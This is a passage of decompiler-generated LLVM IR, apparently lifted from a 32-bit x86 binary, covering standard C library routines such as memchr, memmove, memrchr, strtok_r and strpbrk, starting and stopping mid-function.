  %v2_805624d = inttoptr i32 %v1_805624d to i32*
  %v3_805624d = load i32, i32* %v2_805624d, align 4
  %v15_805624d = icmp eq i32 %v3_805624d, %v3_805624a
  %v1_8056250 = icmp eq i1 %v15_805624d, false
  br i1 %v1_8056250, label %dec_label_pc_8056299, label %dec_label_pc_8056252

dec_label_pc_8056252:                             ; preds = %dec_label_pc_805624a
  %v1_8056252 = add i32 %v2_805625b, 4
  %v2_8056252 = inttoptr i32 %v1_8056252 to i32*
  %v3_8056252 = load i32, i32* %v2_8056252, align 4
  %v13_8056252 = icmp eq i32 %v3_8056252, -2
  %v1_8056256 = icmp eq i1 %v13_8056252, false
  br i1 %v1_8056256, label %dec_label_pc_8056260, label %dec_label_pc_8056258

dec_label_pc_8056258:                             ; preds = %dec_label_pc_8056252
  %v1_8056258 = or i32 %v3_8056227, 4
  store i32 %v1_8056258, i32* @ecx, align 4
  %v1_805625b = trunc i32 %v1_8056258 to i16
  store i16 %v1_805625b, i16* %v1_8056227, align 2
  br label %dec_label_pc_80562be

dec_label_pc_8056260:                             ; preds = %dec_label_pc_8056252
  %v3_8056260 = and i16 %v2_8056227, 768
  %v4_8056260 = icmp eq i16 %v3_8056260, 0
  br i1 %v4_8056260, label %dec_label_pc_8056275, label %dec_label_pc_8056265

dec_label_pc_8056265:                             ; preds = %dec_label_pc_8056260
  %v3_805626d = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805c298.477 to i16*))
  %v0_8056275.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056275

dec_label_pc_8056275:                             ; preds = %dec_label_pc_8056260, %dec_label_pc_8056265
  %v0_80562aa = phi i32 [ %v2_805625b, %dec_label_pc_8056260 ], [ %v0_8056275.pre, %dec_label_pc_8056265 ]
  %v1_8056275 = add i32 %v0_80562aa, 8
  %v2_8056275 = inttoptr i32 %v1_8056275 to i32*
  %v3_8056275 = load i32, i32* %v2_8056275, align 4
  %v1_8056278 = add i32 %v0_80562aa, 12
  %v2_8056278 = inttoptr i32 %v1_8056278 to i32*
  %v3_8056278 = load i32, i32* %v2_8056278, align 4
  %v15_8056278 = icmp eq i32 %v3_8056278, %v3_8056275
  br i1 %v15_8056278, label %dec_label_pc_80562a2, label %dec_label_pc_805627d

dec_label_pc_805627d:                             ; preds = %dec_label_pc_8056275
  %v2_8056280 = add i32 %v0_80562aa, 24
  %v3_8056280 = inttoptr i32 %v2_8056280 to i32*
  store i32 %v3_8056275, i32* %v3_8056280, align 4
  %v0_8056283 = load i32, i32* @ebx, align 4
  %v2_8056284 = call i32 @__stdio_rfill(i32 %v0_8056283)
  %v1_805628c = icmp eq i32 %v2_8056284, 0
  br i1 %v1_805628c, label %dec_label_pc_80562be, label %dec_label_pc_8056290

dec_label_pc_8056290:                             ; preds = %dec_label_pc_805627d
  %v0_8056290 = load i32, i32* @ebx, align 4
  %v1_8056290 = add i32 %v0_8056290, 20
  %v2_8056290 = inttoptr i32 %v1_8056290 to i32*
  %v3_8056290 = load i32, i32* %v2_8056290, align 4
  %v2_8056293 = add i32 %v0_8056290, 24
  %v3_8056293 = inttoptr i32 %v2_8056293 to i32*
  store i32 %v3_8056290, i32* %v3_8056293, align 4
  %v0_8056296 = load i32, i32* @ebx, align 4
  %v1_8056296 = add i32 %v0_8056296, 16
  %v2_8056296 = inttoptr i32 %v1_8056296 to i32*
  %v3_8056296 = load i32, i32* %v2_8056296, align 4
  br label %dec_label_pc_8056299

dec_label_pc_8056299:                             ; preds = %dec_label_pc_805624a, %entry, %dec_label_pc_8056290
  %v1_805629d = phi i32 [ %v2_805625b, %dec_label_pc_805624a ], [ %v4_80561f0, %entry ], [ %v0_8056296, %dec_label_pc_8056290 ]
  %v0_8056299 = phi i32 [ %v3_805624a, %dec_label_pc_805624a ], [ %v3_80561f4, %entry ], [ %v3_8056296, %dec_label_pc_8056290 ]
  %v1_8056299 = inttoptr i32 %v0_8056299 to i8*
  %v2_8056299 = load i8, i8* %v1_8056299, align 1
  %v3_8056299 = zext i8 %v2_8056299 to i32
  store i32 %v3_8056299, i32* @edx, align 4
  %v1_805629c = add i32 %v0_8056299, 1
  %v2_805629d = add i32 %v1_805629d, 16
  %v3_805629d = inttoptr i32 %v2_805629d to i32*
  store i32 %v1_805629c, i32* %v3_805629d, align 4
  %v0_80562c4.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80562c1

dec_label_pc_80562a2:                             ; preds = %dec_label_pc_8056275
  %v2_80562a5 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80562aa = inttoptr i32 %v0_80562aa to i16*
  %v5_80562ab = call i32 @__stdio_READ(i16* %v5_80562aa, i32 %v2_80562a5, i32 1)
  %v1_80562b3 = icmp eq i32 %v5_80562ab, 0
  br i1 %v1_80562b3, label %dec_label_pc_80562be, label %dec_label_pc_80562b7

dec_label_pc_80562b7:                             ; preds = %dec_label_pc_80562a2
  %v3_80562b7 = load i8, i8* %stack_var_-5, align 1
  %v4_80562b7 = sext i8 %v3_80562b7 to i32
  store i32 %v4_80562b7, i32* @edx, align 4
  br label %dec_label_pc_80562c1

dec_label_pc_80562be:                             ; preds = %dec_label_pc_80562a2, %dec_label_pc_805627d, %dec_label_pc_805620f, %dec_label_pc_8056258
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_80562c1

dec_label_pc_80562c1:                             ; preds = %dec_label_pc_80562b7, %dec_label_pc_8056299, %dec_label_pc_805622f, %dec_label_pc_80562be
  %v0_80562c4 = phi i32 [ %v4_80562b7, %dec_label_pc_80562b7 ], [ %v0_80562c4.pre, %dec_label_pc_8056299 ], [ %v1_8056245, %dec_label_pc_805622f ], [ -1, %dec_label_pc_80562be ]
  store i32 %v0_80561ec, i32* @ebx, align 4
  ret i32 %v0_80562c4

; uselistorder directives
  uselistorder i32 %v0_8056299, { 1, 0 }
  uselistorder i32 %v3_8056275, { 1, 0 }
  uselistorder i32 %v0_80562aa, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805624a, { 1, 0, 2 }
  uselistorder i32 %v1_8056245, { 1, 0 }
  uselistorder i16 %v2_8056227, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805625b, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i16* @global_var_805c2e0.468, { 2, 1, 0 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80562c1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80562be, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056299, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056275, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80562c8 = load i32, i32* @edi, align 4
  store i32 %v0_80562c8, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_80562cf = ptrtoint i8* %arg1 to i32
  store i32 %v4_80562cf, i32* %edi.global-to-local, align 4
  %v1_80562d7 = icmp eq i32 %arg3, 0
  store i1 %v1_80562d7, i1* %zf.global-to-local, align 1
  br i1 %v1_80562d7, label %dec_label_pc_80562e7, label %dec_label_pc_80562db

dec_label_pc_80562db:                             ; preds = %entry
  %v2_80562db = call i32 @_strlen(i8* %arg1)
  %v3_80562db = mul i32 %v2_80562db, -1
  %v4_80562db = add i32 %v3_80562db, -2
  store i32 %v4_80562db, i32* @ecx, align 4
  %v0_80562dd = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80562dd, label %dec_label_pc_80562db.dec_label_pc_80562e4_crit_edge, label %dec_label_pc_80562df

dec_label_pc_80562db.dec_label_pc_80562e4_crit_edge: ; preds = %dec_label_pc_80562db
  %v0_80562e4.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_80562e4.pre, -1
  br label %dec_label_pc_80562e4

dec_label_pc_80562df:                             ; preds = %dec_label_pc_80562db
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80562e4

dec_label_pc_80562e4:                             ; preds = %dec_label_pc_80562db.dec_label_pc_80562e4_crit_edge, %dec_label_pc_80562df
  %v0_80562e4 = phi i32 [ %phitmp, %dec_label_pc_80562db.dec_label_pc_80562e4_crit_edge ], [ 0, %dec_label_pc_80562df ]
  %v8_80562e4 = icmp eq i32 %v0_80562e4, 0
  store i1 %v8_80562e4, i1* %zf.global-to-local, align 1
  store i32 %v0_80562e4, i32* %edi.global-to-local, align 4
  %v2_80562e7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80562e7

dec_label_pc_80562e7:                             ; preds = %entry, %dec_label_pc_80562e4
  %v0_80562e8 = phi i32 [ 0, %entry ], [ %v0_80562e4, %dec_label_pc_80562e4 ]
  %v2_80562e7 = phi i32 [ %v0_80562c8, %entry ], [ %v2_80562e7.pre, %dec_label_pc_80562e4 ]
  store i32 %v2_80562e7, i32* @edi, align 4
  ret i32 %v0_80562e8

; uselistorder directives
  uselistorder i32 %v0_80562e4, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80562e7, { 1, 0 }
  uselistorder label %dec_label_pc_80562e4, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80562ed = load i32, i32* @esi, align 4
  store i32 %v0_80562ed, i32* %stack_var_-8, align 4
  %v4_80562ee = ptrtoint i8* %arg1 to i32
  %v9_80562fa = icmp ugt i8* %tmp3, %arg1
  %v1_80562fc = icmp eq i1 %v9_80562fa, false
  br i1 %v1_80562fc, label %dec_label_pc_8056304, label %dec_label_pc_80562fe

dec_label_pc_80562fe:                             ; preds = %entry
  %v7_8056300 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8056310

dec_label_pc_8056304:                             ; preds = %entry
  %v3_8056304 = add i32 %arg2, -1
  %v4_8056304 = add i32 %v3_8056304, %tmp
  %v5_8056304 = inttoptr i32 %v4_8056304 to i8*
  %v3_8056308 = add i32 %v4_80562ee, -1
  %v4_8056308 = add i32 %v3_8056308, %tmp
  %v5_8056308 = inttoptr i32 %v4_8056308 to i8*
  %v7_805630d = call i8* @_memcpy(i8* %v5_8056308, i8* %v5_8056304, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8056310

dec_label_pc_8056310:                             ; preds = %dec_label_pc_80562fe, %dec_label_pc_8056304
  %v2_8056310 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056310, i32* @esi, align 4
  ret i32 %v4_80562ee

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056310, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8056314 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8056327 = inttoptr i32 %arg1 to i16*
  %v4_8056327 = call i32 @memcpy(i16* %v3_8056327, i32 %arg2, i32 %arg3)
  %v0_805632f = load i32, i32* @esi, align 4
  %v2_805632f = add i32 %v0_805632f, %arg3
  store i32 %v0_8056314, i32* @esi, align 4
  ret i32 %v2_805632f
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_805633d = urem i32 %arg2, 256
  %v4_8056349 = sext i8 %arg1 to i32
  %v2_805634d = add i32 %v4_8056349, %arg3
  %v1_805635f7 = icmp eq i32 %arg3, 0
  br i1 %v1_805635f7, label %dec_label_pc_8056367, label %dec_label_pc_8056363

dec_label_pc_8056351:                             ; preds = %dec_label_pc_8056363
  %v1_8056351 = add i32 %v0_8056351, -1
  %v5_8056352 = load i32, i32* @edx, align 4
  %v6_8056352 = and i32 %v5_8056352, -256
  %v7_8056352 = or i32 %v6_8056352, %v4_805633d
  store i32 %v7_8056352, i32* @edx, align 4
  %v1_8056356 = inttoptr i32 %v1_8056351 to i8*
  %v2_8056356 = load i8, i8* %v1_8056356, align 1
  %v15_8056356 = icmp eq i8 %v2_8056356, %tmp
  br i1 %v15_8056356, label %dec_label_pc_80563e4, label %dec_label_pc_805635e

dec_label_pc_805635e:                             ; preds = %dec_label_pc_8056351
  %v1_805635e = add i32 %v0_805635e, -1
  %v8_805635e = icmp eq i32 %v1_805635e, 0
  br i1 %v8_805635e, label %dec_label_pc_8056367, label %dec_label_pc_8056363

dec_label_pc_8056363:                             ; preds = %entry, %dec_label_pc_805635e
  %v0_805635e = phi i32 [ %v1_805635e, %dec_label_pc_805635e ], [ %arg3, %entry ]
  %v0_8056351 = phi i32 [ %v1_8056351, %dec_label_pc_805635e ], [ %v2_805634d, %entry ]
  %v2_8056363 = urem i32 %v0_8056351, 4
  %v3_8056363 = icmp eq i32 %v2_8056363, 0
  %v1_8056365 = icmp eq i1 %v3_8056363, false
  br i1 %v1_8056365, label %dec_label_pc_8056351, label %dec_label_pc_8056367

dec_label_pc_8056367:                             ; preds = %dec_label_pc_805635e, %dec_label_pc_8056363, %entry
  %v0_80563ca.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_805635e ], [ %v0_805635e, %dec_label_pc_8056363 ]
  %v0_805636c = phi i32 [ %v2_805634d, %entry ], [ %v1_8056351, %dec_label_pc_805635e ], [ %v0_8056351, %dec_label_pc_8056363 ]
  store i32 %v0_805636c, i32* @ecx, align 4
  %v2_8056370 = mul nuw nsw i32 %v4_805633d, 256
  %v2_8056373 = or i32 %v2_8056370, %v4_805633d
  %v2_8056377 = mul i32 %v2_8056373, 65536
  %v2_805637a = or i32 %v2_8056377, %v2_8056373
  %v6_80563cd55 = icmp ugt i32 %v0_80563ca.pr, 3
  br i1 %v6_80563cd55, label %dec_label_pc_805637e, label %dec_label_pc_80563cf

dec_label_pc_805637e:                             ; preds = %dec_label_pc_8056367, %dec_label_pc_80563c7
  %v0_80563c757 = phi i32 [ %v1_80563c7, %dec_label_pc_80563c7 ], [ %v0_80563ca.pr, %dec_label_pc_8056367 ]
  %v0_805637e56 = phi i32 [ %v1_805637e, %dec_label_pc_80563c7 ], [ %v0_805636c, %dec_label_pc_8056367 ]
  %v1_805637e = add i32 %v0_805637e56, -4
  store i32 %v1_805637e, i32* @ecx, align 4
  %v2_8056383 = inttoptr i32 %v1_805637e to i32*
  %v3_8056383 = load i32, i32* %v2_8056383, align 4
  %v4_8056383 = xor i32 %v3_8056383, %v2_805637a
  %v1_8056385 = add i32 %v4_8056383, 2130640639
  %v1_805638b = sub i32 -1, %v4_8056383
  %v2_805638d = xor i32 %v1_8056385, %v1_805638b
  %v1_805638f = and i32 %v2_805638d, -2130640640
  %v2_805638f = icmp eq i32 %v1_805638f, 0
  br i1 %v2_805638f, label %dec_label_pc_80563c7, label %dec_label_pc_8056397

dec_label_pc_8056397:                             ; preds = %dec_label_pc_805637e
  %v7_8056397 = or i32 %v1_805638f, %v4_805633d
  %v1_805639b = add i32 %v0_805637e56, -1
  %v2_805639e = inttoptr i32 %v1_805639b to i8*
  %v3_805639e = load i8, i8* %v2_805639e, align 1
  %v16_805639e = icmp eq i8 %v3_805639e, %tmp
  br i1 %v16_805639e, label %dec_label_pc_80563e4, label %dec_label_pc_80563a3

dec_label_pc_80563a3:                             ; preds = %dec_label_pc_8056397
  %v1_80563a7 = add i32 %v0_805637e56, -2
  %v2_80563aa = inttoptr i32 %v1_80563a7 to i8*
  %v3_80563aa = load i8, i8* %v2_80563aa, align 1
  %v16_80563aa = icmp eq i8 %v3_80563aa, %tmp
  br i1 %v16_80563aa, label %dec_label_pc_80563e4, label %dec_label_pc_80563af

dec_label_pc_80563af:                             ; preds = %dec_label_pc_80563a3
  %v1_80563b3 = add i32 %v0_805637e56, -3
  %v2_80563b6 = inttoptr i32 %v1_80563b3 to i8*
  %v3_80563b6 = load i8, i8* %v2_80563b6, align 1
  %v16_80563b6 = icmp eq i8 %v3_80563b6, %tmp
  br i1 %v16_80563b6, label %dec_label_pc_80563e4, label %dec_label_pc_80563bb

dec_label_pc_80563bb:                             ; preds = %dec_label_pc_80563af
  %v1_80563bf = inttoptr i32 %v1_805637e to i8*
  %v2_80563bf = load i8, i8* %v1_80563bf, align 1
  %v15_80563bf = icmp eq i8 %v2_80563bf, %tmp
  %v1_80563c1 = icmp eq i1 %v15_80563bf, false
  br i1 %v1_80563c1, label %dec_label_pc_80563c7, label %dec_label_pc_80563c3

dec_label_pc_80563c3:                             ; preds = %dec_label_pc_80563bb
  br label %dec_label_pc_80563e4

dec_label_pc_80563c7:                             ; preds = %dec_label_pc_80563bb, %dec_label_pc_805637e
  %v5_80563d427 = phi i32 [ %v7_8056397, %dec_label_pc_80563bb ], [ 0, %dec_label_pc_805637e ]
  %v1_80563c7 = add i32 %v0_80563c757, -4
  %v6_80563cd = icmp ugt i32 %v1_80563c7, 3
  br i1 %v6_80563cd, label %dec_label_pc_805637e, label %dec_label_pc_80563cf

dec_label_pc_80563cf:                             ; preds = %dec_label_pc_80563c7, %dec_label_pc_8056367
  %v5_80563d426.lcssa = phi i32 [ %v4_805633d, %dec_label_pc_8056367 ], [ %v5_80563d427, %dec_label_pc_80563c7 ]
  %v0_805637e.lcssa = phi i32 [ %v0_805636c, %dec_label_pc_8056367 ], [ %v1_805637e, %dec_label_pc_80563c7 ]
  %v0_80563c7.lcssa = phi i32 [ %v0_80563ca.pr, %dec_label_pc_8056367 ], [ %v1_80563c7, %dec_label_pc_80563c7 ]
  br label %dec_label_pc_80563dc

dec_label_pc_80563d3:                             ; preds = %dec_label_pc_80563dc
  %v1_80563dc = add i32 %v0_80563dc, -1
  %v1_80563d3 = add i32 %v0_80563d3, -1
  %v6_80563d4 = and i32 %v5_80563d4, -256
  %v7_80563d4 = or i32 %v6_80563d4, %v4_805633d
  %v1_80563d8 = inttoptr i32 %v1_80563d3 to i8*
  %v2_80563d8 = load i8, i8* %v1_80563d8, align 1
  %v15_80563d8 = icmp eq i8 %v2_80563d8, %tmp
  br i1 %v15_80563d8, label %dec_label_pc_80563e4, label %dec_label_pc_80563dc

dec_label_pc_80563dc:                             ; preds = %dec_label_pc_80563d3, %dec_label_pc_80563cf
  %v5_80563d4 = phi i32 [ %v7_80563d4, %dec_label_pc_80563d3 ], [ %v5_80563d426.lcssa, %dec_label_pc_80563cf ]
  %v0_80563d3 = phi i32 [ %v1_80563d3, %dec_label_pc_80563d3 ], [ %v0_805637e.lcssa, %dec_label_pc_80563cf ]
  %v0_80563dc = phi i32 [ %v1_80563dc, %dec_label_pc_80563d3 ], [ %v0_80563c7.lcssa, %dec_label_pc_80563cf ]
  %v10_80563dd = icmp eq i32 %v0_80563dc, 0
  %v1_80563e0 = icmp eq i1 %v10_80563dd, false
  br i1 %v1_80563e0, label %dec_label_pc_80563d3, label %dec_label_pc_80563e2

dec_label_pc_80563e2:                             ; preds = %dec_label_pc_80563dc
  br label %dec_label_pc_80563e4

dec_label_pc_80563e4:                             ; preds = %dec_label_pc_8056351, %dec_label_pc_80563af, %dec_label_pc_80563a3, %dec_label_pc_8056397, %dec_label_pc_80563d3, %dec_label_pc_80563c3, %dec_label_pc_80563e2
  %v0_80563e7 = phi i32 [ %v1_805637e, %dec_label_pc_80563c3 ], [ 0, %dec_label_pc_80563e2 ], [ %v1_80563d3, %dec_label_pc_80563d3 ], [ %v1_80563b3, %dec_label_pc_80563af ], [ %v1_80563a7, %dec_label_pc_80563a3 ], [ %v1_805639b, %dec_label_pc_8056397 ], [ %v1_8056351, %dec_label_pc_8056351 ]
  ret i32 %v0_80563e7

; uselistorder directives
  uselistorder i32 %v0_80563dc, { 1, 0 }
  uselistorder i32 %v1_80563c7, { 0, 2, 1 }
  uselistorder i32 %v1_805637e, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805637e56, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8056373, { 1, 0 }
  uselistorder i32 %v0_8056351, { 1, 0, 2 }
  uselistorder i32 %v2_805634d, { 1, 0 }
  uselistorder i32 %v4_805633d, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 6, 0, 15, 16, 1, 14, 18, 13, 19, 3, 5, 4, 20, 7, 8, 9, 17, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80563e4, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805637e, { 1, 0 }
  uselistorder label %dec_label_pc_8056367, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8056363, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80563e8 = load i32, i32* @edi, align 4
  %v0_80563e9 = load i32, i32* @esi, align 4
  %v0_80563ea = load i32, i32* @ebx, align 4
  store i32 %v0_80563ea, i32* %stack_var_-12, align 4
  %v4_80563eb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80563eb, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80563f7 = icmp eq i8* %arg1, null
  %v1_80563f9 = icmp eq i1 %v1_80563f7, false
  br i1 %v1_80563f9, label %dec_label_pc_80563fd, label %dec_label_pc_80563fb

dec_label_pc_80563fb:                             ; preds = %entry
  %v1_80563fb = inttoptr i32 %arg3 to i32*
  %v2_80563fb = load i32, i32* %v1_80563fb, align 4
  store i32 %v2_80563fb, i32* @ebx, align 4
  br label %dec_label_pc_80563fd

dec_label_pc_80563fd:                             ; preds = %entry, %dec_label_pc_80563fb
  %v0_8056400 = phi i32 [ %v4_80563eb, %entry ], [ %v2_80563fb, %dec_label_pc_80563fb ]
  %v0_80563fd = load i32, i32* @ecx, align 4
  %v5_8056400 = inttoptr i32 %v0_8056400 to i8*
  %v8_8056401 = call i32 @__GI_strspn(i8* %v5_8056400, i32 %arg2, i32 %v0_80563fd, i32 %v0_80563fd)
  store i32 %v8_8056401, i32* %eax.global-to-local, align 4
  %v0_8056409 = load i32, i32* @ebx, align 4
  %v2_8056409 = add i32 %v0_8056409, %v8_8056401
  store i32 %v2_8056409, i32* @ebx, align 4
  %v1_805640b = inttoptr i32 %v2_8056409 to i8*
  %v2_805640b = load i8, i8* %v1_805640b, align 1
  %v3_805640b = icmp eq i8 %v2_805640b, 0
  %v1_805640e = icmp eq i1 %v3_805640b, false
  br i1 %v1_805640e, label %dec_label_pc_8056416, label %dec_label_pc_8056410

dec_label_pc_8056410:                             ; preds = %dec_label_pc_80563fd
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8056412 = load i32, i32* @esi, align 4
  %v2_8056412 = inttoptr i32 %v1_8056412 to i32*
  store i32 %v2_8056409, i32* %v2_8056412, align 4
  %v0_8056440.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805643d

dec_label_pc_8056416:                             ; preds = %dec_label_pc_80563fd
  %v0_8056416 = load i32, i32* @edx, align 4
  %v0_8056418 = load i32, i32* @edi, align 4
  %v8_805641a = call i32 @__GI_strpbrk(i8* %v1_805640b, i32 %v0_8056418, i32 %v0_8056416, i32 %v0_8056416)
  store i32 %v8_805641a, i32* %eax.global-to-local, align 4
  %v2_8056422 = icmp eq i32 %v8_805641a, 0
  %v1_8056424 = icmp eq i1 %v2_8056422, false
  br i1 %v1_8056424, label %dec_label_pc_8056435, label %dec_label_pc_8056426

dec_label_pc_8056426:                             ; preds = %dec_label_pc_8056416
  %v0_805642a = load i32, i32* @ebx, align 4
  %v5_805642a = inttoptr i32 %v0_805642a to i8*
  %v8_805642b = call i32 @rawmemchr(i8* %v5_805642a, i32 0, i32 %v8_805641a, i32 %v8_805641a)
  br label %dec_label_pc_8056439

dec_label_pc_8056435:                             ; preds = %dec_label_pc_8056416
  %v9_805641a = inttoptr i32 %v8_805641a to i8*
  store i8 0, i8* %v9_805641a, align 1
  %v2_8056438 = add i32 %v8_805641a, 1
  br label %dec_label_pc_8056439

dec_label_pc_8056439:                             ; preds = %dec_label_pc_8056426, %dec_label_pc_8056435
  %storemerge = phi i32 [ %v2_8056438, %dec_label_pc_8056435 ], [ %v8_805642b, %dec_label_pc_8056426 ]
  %v0_8056439 = phi i32 [ %v2_8056438, %dec_label_pc_8056435 ], [ %v8_805642b, %dec_label_pc_8056426 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8056439 = load i32, i32* @esi, align 4
  %v2_8056439 = inttoptr i32 %v1_8056439 to i32*
  store i32 %v0_8056439, i32* %v2_8056439, align 4
  %v0_805643b = load i32, i32* @ebx, align 4
  store i32 %v0_805643b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805643d

dec_label_pc_805643d:                             ; preds = %dec_label_pc_8056410, %dec_label_pc_8056439
  %v0_8056440 = phi i32 [ %v0_8056440.pre, %dec_label_pc_8056410 ], [ %v0_805643b, %dec_label_pc_8056439 ]
  %v2_805643d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805643d, i32* @ebx, align 4
  store i32 %v0_80563e9, i32* @esi, align 4
  store i32 %v0_80563e8, i32* @edi, align 4
  ret i32 %v0_8056440

; uselistorder directives
  uselistorder i32 %v8_805641a, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805643d, { 1, 0 }
  uselistorder label %dec_label_pc_8056439, { 1, 0 }
  uselistorder label %dec_label_pc_80563fd, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8056445 = load i32, i32* @ebx, align 4
  %v2_805645c26 = load i8, i8* %arg1, align 1
  %v4_805645e30 = icmp eq i8 %v2_805645c26, 0
  br i1 %v4_805645e30, label %dec_label_pc_8056466, label %dec_label_pc_8056462.lr.ph

dec_label_pc_8056462.lr.ph:                       ; preds = %entry
  %v3_805645c27 = zext i8 %v2_805645c26 to i32
  %v5_805645c28 = and i32 %v0_8056445, -256
  %v6_805645c29 = or i32 %v3_805645c27, %v5_805645c28
  %v4_805644a = ptrtoint i8* %arg1 to i32
  %v1_805645514 = inttoptr i32 %arg2 to i8*
  %v4_8056455.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056462

dec_label_pc_8056450:                             ; preds = %dec_label_pc_8056462, %dec_label_pc_8056454
  %v6_805645524 = phi i32 [ %v6_8056455, %dec_label_pc_8056454 ], [ %v6_805645518, %dec_label_pc_8056462 ]
  %v2_805645523 = phi i8 [ %v2_8056455, %dec_label_pc_8056454 ], [ %v2_805645515, %dec_label_pc_8056462 ]
  %v0_805645422 = phi i32 [ %v1_8056454, %dec_label_pc_8056454 ], [ %arg2, %dec_label_pc_8056462 ]
  %v15_8056450 = icmp eq i8 %v2_805645523, %v2_805645c34
  br i1 %v15_8056450, label %dec_label_pc_8056468, label %dec_label_pc_8056454

dec_label_pc_8056454:                             ; preds = %dec_label_pc_8056450
  %v1_8056454 = add i32 %v0_805645422, 1
  store i32 %v1_8056454, i32* @edx, align 4
  %v1_8056455 = inttoptr i32 %v1_8056454 to i8*
  %v2_8056455 = load i8, i8* %v1_8056455, align 1
  %v3_8056455 = zext i8 %v2_8056455 to i32
  %v5_8056455 = and i32 %v6_805645524, -256
  %v6_8056455 = or i32 %v3_8056455, %v5_8056455
  store i32 %v6_8056455, i32* @ecx, align 4
  %v4_8056457 = icmp eq i8 %v2_8056455, 0
  %v1_8056459 = icmp eq i1 %v4_8056457, false
  br i1 %v1_8056459, label %dec_label_pc_8056450, label %dec_label_pc_805645b

dec_label_pc_805645b:                             ; preds = %dec_label_pc_8056454, %dec_label_pc_8056462
  %v4_8056455.pre37 = phi i32 [ %v6_805645518, %dec_label_pc_8056462 ], [ %v6_8056455, %dec_label_pc_8056454 ]
  %v1_805645b = add i32 %v0_805645b32, 1
  %v1_805645c = inttoptr i32 %v1_805645b to i8*
  %v2_805645c = load i8, i8* %v1_805645c, align 1
  %v3_805645c = zext i8 %v2_805645c to i32
  %v5_805645c = and i32 %v6_805645c35, -256
  %v6_805645c = or i32 %v3_805645c, %v5_805645c
  %v4_805645e = icmp eq i8 %v2_805645c, 0
  br i1 %v4_805645e, label %dec_label_pc_8056466, label %dec_label_pc_8056462

dec_label_pc_8056462:                             ; preds = %dec_label_pc_8056462.lr.ph, %dec_label_pc_805645b
  %v4_8056455.pre = phi i32 [ %v4_8056455.pre.pre, %dec_label_pc_8056462.lr.ph ], [ %v4_8056455.pre37, %dec_label_pc_805645b ]
  %v6_805645c35 = phi i32 [ %v6_805645c29, %dec_label_pc_8056462.lr.ph ], [ %v6_805645c, %dec_label_pc_805645b ]
  %v2_805645c34 = phi i8 [ %v2_805645c26, %dec_label_pc_8056462.lr.ph ], [ %v2_805645c, %dec_label_pc_805645b ]
